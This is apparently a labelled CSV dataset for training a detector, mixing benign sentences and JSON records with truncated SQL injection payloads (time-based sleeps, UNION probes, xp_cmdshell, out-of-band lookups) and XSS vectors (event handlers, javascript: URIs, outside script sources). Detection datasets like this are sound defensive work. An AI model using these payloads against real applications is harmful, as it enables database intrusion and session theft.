Payload,Label,text_label,ID
select sleep ( 5 ) and 'hhrw' like 'hhrw,2,SQLi,21133
Select charm.,0,normal,24726
"<;A HREF="";http://0102.0146.0007.00000223/"";>;XSS<",1,XSS,1671
"""Select ""channel"" on the left menu, then click ""st",0,normal,26455
Select find.,0,normal,24596
"1"" and 8635 = ( select count ( * ) from generate_s",2,SQLi,20919
<xmp onpointerenter=alert(1)>XSS</xmp>,1,XSS,8179
â><sâ%2bâcript>alert(document.cookie)</script>,1,XSS,939
-3179'+ ( select 'tzzz' where 3191 = 3191 union al,2,SQLi,13480
Where did you find that serene retreat?,0,normal,23937
-6067'+ ( select 'bfhf' where 3114 = 3114 union al,2,SQLi,19033
1' ) ) ) rlike sleep ( 5 ) and ( ( ( 'zwyx' = 'zwy,2,SQLi,18988
"-4385%' ) ) union all select 6694,6694,6694,6694,6",2,SQLi,14631
"<plaintext onbeforepaste=""alert(1)"" contenteditabl",1,XSS,3901
RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d,2,SQLi,10337
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,6747
<canvas onpointerup=alert(1)>XSS</canvas>,1,XSS,7922
1' ) ) ) or ( select 9173 from ( select count ( * ,2,SQLi,15843
1 ) and sleep ( 5 ) and ( 4855 = 4855,2,SQLi,16210
<output onpointermove=alert(1)>XSS</output>,1,XSS,6159
"<summary onmouseup=""alert(1)"">test</summary>",1,XSS,3315
"1"" ) or 8421 = ( select count ( * ) from generate_",2,SQLi,15118
"ABC<div style=""x:\x00expression(javascript:alert(1",1,XSS,480
Redirect 302 /a.jpg http://victimsite.com/admin.as,1,XSS,1598
1' ) ) and char ( 120 ) ||char ( 106 ) ||char ( 11,2,SQLi,21510
1,0,normal,26704
select ( case when ( 8663 = 7467 ) then 8663 else ,2,SQLi,19577
1' ) and exp ( ~ ( select * from ( select concat (,2,SQLi,22074
or pg_sleep ( __TIME__ ) --,2,SQLi,11906
Extra 10% off select items with code SUPERSAVER (t,0,normal,26203
"-4347' union all select 6074,6074,6074,6074,6074,6",2,SQLi,13448
1 rlike sleep ( 5 ) # urxh,2,SQLi,18459
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHA",2,SQLi,10682
1'+ ( select 'yjpp' where 8966 = 8966,2,SQLi,13674
create user name identified by pass123 temporary t,2,SQLi,10041
\x1Cjavascript:javascript:alert(1),1,XSS,9476
<rb id=x tabindex=1 ondeactivate=alert(1)></rb><in,1,XSS,8476
call regexp_substring ( repeat ( right ( char ( 37,2,SQLi,17689
"1"" ) ) as qejm where 9014 = 9014 union all select ",2,SQLi,16544
waitfor delay '00:00:05',2,SQLi,10382
"<base onmouseenter=""alert(1)"">test</base>",1,XSS,8842
-9673 ) or 8571 = 8571--,2,SQLi,18318
select * from users where id = 1 or \<$ union sele,2,SQLi,11808
Where's the acupuncture clinic?,0,normal,23633
1'|| ( select 'mosp' where 6085 = 6085,2,SQLi,16224
-7962' ) ) as pgqz where 6058 = 6058 or 4493 = utl,2,SQLi,13874
"-6357"" ) order by 1--",2,SQLi,16523
Where did you find that breathtaking view?,0,normal,23869
<applet onpointerdown=alert(1)>XSS</applet>,1,XSS,5718
<pre id=x tabindex=1 onbeforedeactivate=alert(1)><,1,XSS,1788
select * from users where id = '1' or @ 1 = 1 unio,2,SQLi,11904
He selected a classic novel to read on vacation.,0,normal,23733
Where's the library?,0,normal,23507
"{""id"":null,""name"":""Krookodile""}",0,normal,27312
"1"" and 3707 = ( select count ( * ) from sysibm.sys",2,SQLi,20419
"<multicol draggable=""true"" ondragleave=""alert(1)"">",1,XSS,7481
"select pg_sleep ( 5 ) and ( ""tpry"" = ""tpry",2,SQLi,21471
<input onpointerenter=alert(1)>XSS</input>,1,XSS,5721
select the dog,0,normal,25687
1'|| ( select 'ifts' from dual where 6329 = 6329,2,SQLi,17381
[notmalicious](javascript:window.onerror=alert;thr,1,XSS,9418
<figure onfocusout=alert(1) tabindex=1 id=x></figu,1,XSS,8043
"{""id"":null,""firstName"":""Nurul"",""lastName"":""Atiqah""",0,normal,27274
-6789'|| ( select 'uckz' from dual where 2163 = 21,2,SQLi,14859
"<var onmouseover=""prompt(1)"">On Mouse Over</var>",1,XSS,884
Select travel.,0,normal,24649
"<a href=""javascript\x0D:javascript:alert(1)"" id=""f",1,XSS,544
<style>:target {color: red;}</style><image id=x st,1,XSS,8762
<blink onpointerleave=alert(1)>XSS</blink>,1,XSS,8801
1'+ ( select brgo where 9100 = 9100 or 4240 = ( se,2,SQLi,18881
"1"" ) order by 1#",2,SQLi,22178
select * from users where id = 1.%@ or 1 = 1 -- 1,2,SQLi,11744
-5286' or 6783 = 1233,2,SQLi,17929
"1"" ) ) ) and make_set ( 7809 = 9564,9564 ) and ( (",2,SQLi,21505
"<table onkeypress=""alert(1)"" contenteditable>test<",1,XSS,4922
"-4012"" ) or make_set ( 9354 = 9354,7185 ) and ( ""c",2,SQLi,15622
Select a comfortable chair.,0,normal,22594
1 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||,2,SQLi,16228
Lady Macbeth is out in select U.S. theaters tomorr,0,normal,25915
Select your disagreement.,0,normal,24912
Modify the game.,0,normal,22820
"A select few, however, collect shoes â lots of the",0,normal,26419
<link onblur=alert(1) tabindex=1 id=x></link><inpu,1,XSS,1979
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10798
"Simply select the layer you wish to paint onto, ma",0,normal,25546
"Now, we may select any definite quantity of work w",0,normal,25856
IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl-,2,SQLi,10339
( select ( case when ( 3531 = 3531 ) then ( select,2,SQLi,15139
1'+ ( select 'tzey' where 4491 = 4491 union all se,2,SQLi,18644
<font id=x tabindex=1 onactivate=alert(1)></font>,1,XSS,4460
<style>:target {transform: rotate(180deg);}</style,1,XSS,5743
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,2162
"1"" union all select null,null,null,null--",2,SQLi,12624
<tt onpointerup=alert(1)>XSS</tt>,1,XSS,7823
"&lt;IMG SRC=\""mocha&#58;&#91;code&#93;\""&gt;",1,XSS,991
1' ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ,2,SQLi,21600
Select from translucent vellum to reveal the color,0,normal,25626
"1%"" ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171",2,SQLi,15596
select,0,normal,26590
"<datalist oncontextmenu=""alert(1)"">test</datalist>",1,XSS,5437
Select a book.,0,normal,24802
Select the best wedding photographer.,0,normal,24403
select * from users where id = 1.&&1 union select ,2,SQLi,11516
else dbms_lock.sleep ( 0 ),2,SQLi,20206
"1"" where 7015 = 7015",2,SQLi,17965
-2707' ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( 'm,2,SQLi,13703
I'm thinking of where to spend my evening.,0,normal,23715
1 or ( select * from ( select ( sleep ( 5 ) ) ) sd,2,SQLi,12977
0 or 1 = 1,2,SQLi,11599
"<a href=""\x19javascript:javascript:alert(1)"" id=""f",1,XSS,511
"1"" ) as vcir where 6275 = 6275 and char ( 109 ) ||",2,SQLi,14245
declare @s varchar(22) select @s =,2,SQLi,10132
"1 ) ) union all select null,null,null,null,null,nu",2,SQLi,20260
"<rb draggable=""true"" ondragenter=""alert(1)"">test</",1,XSS,8351
"-5959"" or 2477 = 1144",2,SQLi,17096
"<sCrIpt/""<a""/srC=data:="".<a,[8].some(confirm)>",1,XSS,9246
<label onpointermove=alert(1)>XSS</label>,1,XSS,8197
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerher,1,XSS,840
"1"" ) ) and 8514 = ( select count ( * ) from domain",2,SQLi,14935
"-3230"" ) ) as kbxc where 5007 = 5007 or 2107 = 881",2,SQLi,21875
1' ) where 8167 = 8167,2,SQLi,22457
Select your objective.,0,normal,24844
1'|| ( select 'feki' where 4082 = 4082 and ( 3587 ,2,SQLi,13822
"<ins draggable=""true"" ondragleave=""alert(1)"">test<",1,XSS,3960
1' ) ) as fwhv where 3921 = 3921 union all select ,2,SQLi,13360
"<audio onkeydown=""alert(1)"" contenteditable>test</",1,XSS,4842
"<hgroup oncut=""alert(1)"" contenteditable>test</hgr",1,XSS,4892
Let's find out where the nearest bus stop is.,0,normal,23792
"<IMG STYLE=""xss:expr/*XSS*/ession(javascript:alert",1,XSS,763
1 ) as selm where 5759 = 5759,2,SQLi,18508
Join us for dinner.,0,normal,22548
"<i draggable=""true"" ondragend=""alert(1)"">test</i>",1,XSS,4843
"-6129 union all select 9122,9122#",2,SQLi,14256
"1"" ) as uorp where 7208 = 7208",2,SQLi,20852
"1"" or 5286 = ( select count ( * ) from all_users t",2,SQLi,15882
-2050' union all select 5606#,2,SQLi,13845
<font onpointerover=alert(1)>XSS</font>,1,XSS,7079
"><script>alert(String.fromCharCode(66, 108, 65, 99",1,XSS,1144
"select * from users where id = 1 or 1#""{ union sel",2,SQLi,11658
"<sup onmousedown=""alert(1)"">test</sup>",1,XSS,6192
"1"" ) where 2136 = 2136 or 7552 = ( select count ( ",2,SQLi,12206
"{""id"":null,""name"":""stream light""}",0,normal,27607
"-8608"" or 5460 = 4461--",2,SQLi,17672
select * from users where id = 1.&&@ union select ,2,SQLi,11923
"1%' ) and make_set ( 8403 = 8403,8899 ) and ( '%' ",2,SQLi,22258
"1"" ) ) as oxrr where 6141 = 6141 or 6979 = like ( ",2,SQLi,15964
"<param ondblclick=""alert(1)"">test</param>",1,XSS,5464
"-8929' union all select 5324,5324,5324,5324,5324,5",2,SQLi,19287
"<ruby draggable=""true"" ondrag=""alert(1)"">test</rub",1,XSS,5159
<del id=x tabindex=1 onactivate=alert(1)></del>,1,XSS,1803
"<q onbeforepaste=""alert(1)"" contenteditable>test</",1,XSS,4759
"%' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND",2,SQLi,11298
"1"" where 8978 = 8978 union all select null,null,nu",2,SQLi,21724
<colgroup onpointermove=alert(1)>XSS</colgroup>,1,XSS,4352
"1%' ) ) ) or 8384 = like ( 'abcdefg',upper ( hex (",2,SQLi,16650
1%' ) and sleep ( 5 ) #,2,SQLi,18082
"<a href=""\xE2\x80\xA8javascript:javascript:alert(1",1,XSS,531
))))) waitfor delay '0:0:20' /*,2,SQLi,22495
"1"" and sleep ( 5 ) #",2,SQLi,17289
<img src=x onload=prompt(1) onerror=alert(1) onmou,1,XSS,9830
header('Location: '.$_GET['param']);,1,XSS,1921
""")))))) waitfor delay '0:0:20' --",2,SQLi,10948
if ( 8537 = 7034 ) select 8537 else drop function ,2,SQLi,12827
"<script>{onerror=eval}throw{lineNumber:1,columnNum",1,XSS,125
"1%"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71",2,SQLi,14816
"-2120"" ) union all select 9614--",2,SQLi,20345
Select your ambition.,0,normal,24933
1' rlike sleep ( 5 ),2,SQLi,20067
"-8129' ) ) ) union all select 4531,4531,4531#",2,SQLi,15531
exec master..xp_cmdshell 'net+users',2,SQLi,10035
1'|| ( select 'scba' where 9079 = 9079 and 8635 = ,2,SQLi,18039
"<big onmouseenter=""alert(1)"">test</big>",1,XSS,1951
But paying to select a seat doesn't necessarily me,0,normal,26306
"{""id"":null,""name"":""else town""}",0,normal,27392
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) an",2,SQLi,14159
"1%' ) ) union all select null,null,null--",2,SQLi,18468
"{""id"":null,""firstName"":""Cassia"",""lastName"":""Seah"",",0,normal,26899
"email=test@gmail.com'XOR(if(now()=sysdate(),sleep(",2,SQLi,11369
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1",2,SQLi,10607
1'+ ( select 'iqxn' where 1146 = 1146 and 3715 in ,2,SQLi,15745
1 ) as bgvd where 1753 = 1753 and 6510 = ( select ,2,SQLi,15636
The Oogie Boogie Bash is offered on select nights ,0,normal,25403
""" or 0 = 0 --",2,SQLi,11432
"-3279"" union all select 8568,8568,8568,8568--",2,SQLi,12317
"1' ) where 9006 = 9006 union all select null,null,",2,SQLi,16222
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12--",2,SQLi,10574
"select * from users where id = 1 or "" ( ["" or 1 = ",2,SQLi,11701
1' ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ,2,SQLi,15234
"iif ( 9342 = 6508,1,1/0 )",2,SQLi,20080
"{""id"":null,""firstName"":""Jaylen"",""lastName"":""Chuan""",0,normal,27225
These private accounts often have a considerably s,0,normal,25322
<style onload=alert(1)></style>,1,XSS,6344
AND 1=utl_inaddr.get_host_address((SELECT host_nam,2,SQLi,11071
"-1084' ) union all select 2634,2634,2634,2634,2634",2,SQLi,20560
1 ) ) as tnhy where 1874 = 1874 and 2858 = 7324#,2,SQLi,13602
1'|| ( select 'xwbo' from dual where 1263 = 1263 w,2,SQLi,17539
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,1,XSS,848
"<main onkeypress=""alert(1)"" contenteditable>test</",1,XSS,2379
"-5205' ) ) union all select 8592,8592,8592,8592,85",2,SQLi,15144
"-8966"" ) ) ) or 1628 = 2712",2,SQLi,20592
<small id=x tabindex=1 onfocus=alert(1)></small>,1,XSS,7897
"-5667%' ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( ",2,SQLi,21307
Our special Fortnite captains will select the top ,0,normal,25798
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,1905
"{""id"":null,""name"":""Porygon""}",0,normal,26760
1' ) ) as jntr where 5051 = 5051 and ( select 9067,2,SQLi,22387
<th onpointerenter=alert(1)>XSS</th>,1,XSS,6682
Select the gear icon â this will prompt a window t,0,normal,25595
1' ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 7,2,SQLi,15947
"a=alert,a(1)",1,XSS,4338
"<IMG SRC=x onunload=""alert(String.fromCharCode(88,",1,XSS,1185
1'+ ( select 'qrml' where 3791 = 3791 or 8384 = li,2,SQLi,12297
-8264%' ) order by 1#,2,SQLi,17122
select name from syscolumns where id = (select id ,2,SQLi,11121
"<html onmousemove=""alert(1)"">test</html>",1,XSS,3062
"<video oncopy=""alert(1)"" contenteditable>test</vid",1,XSS,3862
Select your exchange.,0,normal,25046
"1"" ) ) ) or 9643 = ( select count ( * ) from domai",2,SQLi,16850
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",1,XSS,289
"select count ( * ) from domain.domains as t1,domai",2,SQLi,15534
<script>var x = document.createElement('iframe');d,1,XSS,9296
><script+src=https://passport.ngs.ru/ajax/check?ca,1,XSS,9808
Index columns where needed.,0,normal,23272
`'><script>\xE2\x80\x8Bjavascript:alert(1)</script,1,XSS,583
<dialog onblur=alert(1) tabindex=1 id=x></dialog><,1,XSS,4690
<keygen onpointerout=alert(1)>XSS</keygen>,1,XSS,3273
"1, ( select ( case when ( 8596 = 8596 ) then 1 els",2,SQLi,17308
"1"" ) ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ",2,SQLi,17228
<style>:target {color:red;}</style><fieldset id=x ,1,XSS,7038
"1"" where 7022 = 7022",2,SQLi,16690
<style>:target {color: red;}</style><th id=x style,1,XSS,3882
I want to select a course to enhance my skills.,0,normal,23768
<map onpointermove=alert(1)>XSS</map>,1,XSS,2182
"{""id"":null,""firstName"":""Juay"",""lastName"":""Yew Hai""",0,normal,27563
"-5972"" or 8509 = 3448#",2,SQLi,16873
"-5810 union all select 6307,6307,6307,6307,6307,63",2,SQLi,17986
ORDER BY 26,2,SQLi,10330
<cite id=x tabindex=1 onfocus=alert(1)></cite>,1,XSS,7626
1'+ ( select 'zugq' where 9218 = 9218,2,SQLi,17220
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1",2,SQLi,10616
"1%' ) ) union all select null,null,null,null,null,",2,SQLi,20644
"1' ) or row ( 1045,7562 ) > ( select count ( * ) ,",2,SQLi,20220
-2983' ) or 8571 = 8571--,2,SQLi,18970
Select your achieve.,0,normal,25007
"1%' ) union all select null,null,null,null,null,nu",2,SQLi,19684
1 or pg_sleep(__TIME__)--,2,SQLi,10158
You can select an app next to Default Mail Reader.,0,normal,25083
"{""id"":null,""name"":""bow""}",0,normal,27463
-9054 ) ) ) or 9323 = 9323#,2,SQLi,21322
"<center onkeypress=""alert(1)"" contenteditable>test",1,XSS,6204
<style><!--</style><script>document.vulnerable=tru,1,XSS,1538
"<command onmouseover=""alert(1)"">test</command>",1,XSS,3284
select * from users where id = 1 <@$ or 1 = 1 -- 1,2,SQLi,11889
"<<SCRIPT>alert("""");//\<</SCRIPT>",1,XSS,7638
1' ) ) as cwss where 9720 = 9720,2,SQLi,18451
select ( case when ( 1946 = 1302 ) then 1946 else ,2,SQLi,13938
"1' ) ) and make_set ( 8403 = 8403,8899 ) and ( ( '",2,SQLi,18657
"{""id"":null,""name"":""RotomMow Rotom""}",0,normal,27384
In 1842 he published a treatise on The Unity of th,0,normal,26023
"1', ( select ( case when ( 6894 = 6087 ) then 1 el",2,SQLi,12514
"<DIV STYLE=""width:expression(javascript:alert(1));",1,XSS,762
"<blockquote onmouseout=""alert(1)"">test</blockquote",1,XSS,7016
AnD SLEEP(5) ANd '1,2,SQLi,10402
"{""id"":null,""name"":""Golemon""}",0,normal,26945
1%' and 8514 = ( select count ( * ) from domain.do,2,SQLi,20711
call regexp_substring ( repeat ( right ( char ( 37,2,SQLi,12551
<script>eval('\141lert(1)')</script>,1,XSS,186
<X OnXxx=1,1,XSS,9058
"Measure the space, and take these measurements wit",0,normal,25885
The company's management did not give satisfaction,0,normal,25469
<iframe src=http://.rocks/scriptlet.html <,1,XSS,4065
"1' or ( select 9173 from ( select count ( * ) ,con",2,SQLi,12709
"),NULL)%20waitfor%20delay%20'0:0:20'%20/*",2,SQLi,10860
"select pg_sleep ( 5 ) and ( ( ""%"" = """,2,SQLi,21356
replace,0,normal,23207
&lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&,1,XSS,1417
But for the sake of practical convenience it has l,0,normal,26313
"1 ) ) union all select null,null,null#",2,SQLi,19907
"<a href=""javascript\x00:javascript:alert(1)"" id=""f",1,XSS,541
Peru's sol closed 0.30 percent lower and select st,0,normal,25782
1' and 3754 = ( select upper ( xmltype ( chr ( 60 ,2,SQLi,21348
"-9977"" where 5132 = 5132 union all select 5132--",2,SQLi,20649
"1' ) and extractvalue ( 7982,concat ( 0x5c,0x71717",2,SQLi,17822
1%' ) ) and sleep ( 5 ) #,2,SQLi,15212
<source onpointerleave=alert(1)>XSS</source>,1,XSS,7617
Where's the hacienda?,0,normal,23572
<label id=x tabindex=1 onfocusin=alert(1)></label>,1,XSS,6416
<form><button formaction=javascript&colon;alert(1),1,XSS,4330
1%' ) ) and 2716 = ( select count ( * ) from sysus,2,SQLi,15024
<summary id=x tabindex=1 onfocusin=alert(1)></summ,1,XSS,8779
"1' procedure analyse ( extractvalue ( 5840,concat ",2,SQLi,18489
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=&lt;",1,XSS,9052
select pg_sleep ( 5 ) and ( ( 4382 = 4382,2,SQLi,15506
"<ol draggable=""true"" ondragleave=""alert(1)"">test</",1,XSS,2870
"1%' ) ) ) union all select null,null,null#",2,SQLi,15368
"<div draggable=""true"" ondragenter=""alert(1)"">test<",1,XSS,7673
"Select ""Streaming Channels"" in the list on the lef",0,normal,25669
"1"" ) and elt ( 4249 = 4249,7259 ) and ( ""xgka"" lik",2,SQLi,21532
1 ) ) as rcon where 8190 = 8190 or 5286 = ( select,2,SQLi,16049
Insert the code.,0,normal,22818
><script+src=https://bebezoo.1688.com/fragment/ind,1,XSS,9789
<b onfocusout=alert(1) tabindex=1 id=x></b><input ,1,XSS,6633
-3450' where 4478 = 4478 or 9323 = 9323#,2,SQLi,14817
"<object onpaste=""alert(1)"" contenteditable>test</o",1,XSS,7383
"<p onmousemove=""alert(1)"">test</p>",1,XSS,3120
"-9136' ) or make_set ( 9354 = 9354,7185 )",2,SQLi,17562
"<tbody onkeyup=""alert(1)"" contenteditable>test</tb",1,XSS,2954
1'|| ( select 'ybfo' from dual where 3319 = 3319 u,2,SQLi,17428
call regexp_substring ( repeat ( right ( char ( 37,2,SQLi,19441
1' where 1836 = 1836 or char ( 119 ) ||char ( 100 ,2,SQLi,12879
"-8025"" ) or ( 1436 = 4186 ) *4186 and ( ""sqwv"" lik",2,SQLi,12967
"select count ( * ) from all_users t1,all_users t2,",2,SQLi,17172
select,0,normal,26599
"<ol draggable=""true"" ondragend=""alert(1)"">test</ol",1,XSS,6808
Where's the missing link in the chain?,0,normal,22757
"<div id=""127""><svg xmlns=""http://www.w3.org/2000/s",1,XSS,9116
Where can I select a book for my book club?,0,normal,23954
1' ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 1,2,SQLi,13179
1 ) ) as gxvp where 3865 = 3865,2,SQLi,13473
1 ) as mtda where 3951 = 3951,2,SQLi,12638
"<footer oncut=""alert(1)"" contenteditable>test</foo",1,XSS,2207
Where's the medical clinic?,0,normal,23623
1' ) where 3311 = 3311,2,SQLi,19037
-7532 ) ) ) or 4493 = utl_inaddr.get_host_address ,2,SQLi,12849
"1"" ) as nraw where 7984 = 7984 and elt ( 3114 = 31",2,SQLi,21447
"{""id"":null,""firstName"":""Milky"",""lastName"":""Teo"",""a",0,normal,27297
Delete the irrelevant comments.,0,normal,22673
"<spacer draggable=""true"" ondragstart=""alert(1)"">te",1,XSS,2458
"{""id"":null,""firstName"":""Nurul"",""lastName"":""Hidayah",0,normal,27532
<optgroup id=x tabindex=1 onbeforedeactivate=alert,1,XSS,8826
"{""id"":null,""name"":""Darumaka""}",0,normal,27307
"select count ( * ) from rdb$fields as t1,rdb$types",2,SQLi,19760
"1' ) or ( select 9173 from ( select count ( * ) ,c",2,SQLi,19794
And it's driving select members of the media to di,0,normal,26366
-5449' or 4493 = utl_inaddr.get_host_address ( chr,2,SQLi,13368
1'+ ( select 'nlvq' where 7528 = 7528 or ( select ,2,SQLi,12765
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,",2,SQLi,10526
"-6662"" ) ) union all select 6755--",2,SQLi,14672
<table id=x tabindex=1 onactivate=alert(1)></table,1,XSS,6099
"1"" or ( select 9173 from ( select count ( * ) ,con",2,SQLi,20253
"1"" ) ) ) union all select null,null,null,null,null",2,SQLi,15298
"On the main Settings screen, scroll down and selec",0,normal,25840
Select practice.,0,normal,24720
Quickly select dinner.,0,normal,24426
AND 1=utl_inaddr.get_host_address((SELECT DISTINCT,2,SQLi,11093
Plant a thriving garden.,0,normal,22706
Can you help me decide where to eat?,0,normal,23749
I'm not sure where to find the event venue.,0,normal,23690
1' or sleep ( 5 ) and 'rpqn' like 'rpqn,2,SQLi,17664
"1' ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and (",2,SQLi,18089
"1"" ) where 1793 = 1793",2,SQLi,13222
"<kbd onmouseup=""alert(1)"">test</kbd>",1,XSS,7478
<strike onblur=alert(1) tabindex=1 id=x></strike><,1,XSS,2554
<div onfocusout=alert(1) tabindex=1 id=x></div><in,1,XSS,6978
"<noscript oncut=""alert(1)"" contenteditable>test</n",1,XSS,8654
1'+ ( select 'yhcf' where 8367 = 8367,2,SQLi,18845
"1 or elt ( 6272 = 6272,sleep ( 5 ) ) # klaw",2,SQLi,19381
"<;A HREF="";http://66.102.7.147/"";>;XSS<;/A>;",1,XSS,1667
"1"" ) where 7588 = 7588 waitfor delay '0:0:5'--",2,SQLi,21533
"<section onmousedown=""alert(1)"">test</section>",1,XSS,3840
Select voyage.,0,normal,24650
"<del draggable=""true"" ondragend=""alert(1)"">test</d",1,XSS,2584
